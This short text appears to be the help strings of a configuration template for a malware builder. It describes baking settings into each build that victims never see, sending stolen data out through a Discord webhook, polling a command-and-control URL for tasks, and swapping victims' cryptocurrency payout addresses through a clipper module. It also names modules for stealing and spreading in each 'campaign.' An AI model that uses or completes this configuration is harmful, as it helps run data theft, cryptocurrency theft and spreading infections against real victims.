_help: Copy to config.json and fill. Builder bakes this INTO each build. Victim never sees this file.
_mode_help: webhook = exfil only via Discord, no inbound. http = poll C2_URL for tasks (needs portforward). both = webhook exfil + http tasks (recommended). Bot token+channel adds Discord task fallback.
_payout_help: Empty string disables that coin. Also accepted as PAYOUT alias. Update live later via C2 /admin/clip without rebuilding.
_modules_help: false disables that module for this campaign. You can also use single MODULES:{clipper:false} style. Clipper on/off = set all CLIPPER empty vs filled, or MODULES clipper handling via STEAL/SPREAD above.
